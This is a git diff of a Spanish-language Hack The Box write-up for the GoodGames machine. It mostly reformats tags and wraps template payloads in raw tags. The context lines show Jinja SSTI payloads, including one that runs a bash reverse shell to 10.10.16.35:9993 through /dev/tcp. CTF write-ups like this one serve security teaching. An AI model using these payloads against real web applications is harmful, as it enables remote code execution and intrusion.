@@ -6,7 +6,7 @@ categories:
   - HTB
   - Linux
 tags:
-  - Server Side Template Injection (SSTI)
+  - SSTI (Server Side Template Injection)
   - Docker Breakout
   - SQLI (Error Based)
   - Hash Cracking Weak Algorithms
@@ -17,7 +17,7 @@ image:
 
 ## Skills
 
-- Server Side Template Injection (SSTI)
+- SSTI (Server Side Template Injection)
 - Docker Breakout (Privilege Escalation) [PIVOTING]
 - SQLI (Error Based)
 - Hash Cracking Weak Algorithms
@@ -185,7 +185,7 @@ Ya estamos dentro del `panel administrativo`
 
 ![](/assets/img/GoodGames/image_15.png)
 
-Pinchamos en `My Profile` y usamos el payload `{{ 7*7 }}` para testear el `SSTI (Server Side Template Inyection)`
+Pinchamos en `My Profile` y usamos el payload {% raw %} `{{ 7*7 }}` {% endraw %} para testear el `SSTI (Server Side Template Inyection)`
 
 ![](/assets/img/GoodGames/image_16.png)
 
@@ -197,9 +197,11 @@ En `PayloadsAllTheThings` [https://github.com/swisskyrepo/PayloadsAllTheThings/t
 
 ![](/assets/img/GoodGames/image_18.png)
 
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+{% endraw %}
 ## Intrusión
 
 Vamos a mandarnos una `reverse shell` a nuestro equipo para ganar acceso a la máquina víctima, para ello nos ponemos en escucha con `netcat` por el `puerto 9993`
@@ -210,9 +212,11 @@ Vamos a mandarnos una `reverse shell` a nuestro equipo para ganar acceso a la m�
 
 `Inyectamos` este `payload` en el campo `Full Name`
 
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.35/9993 0>&1"').read() }}
 ```
+{% endraw %}
 
 `Ganamos acceso` a la máquina víctima como usuario `root`
 
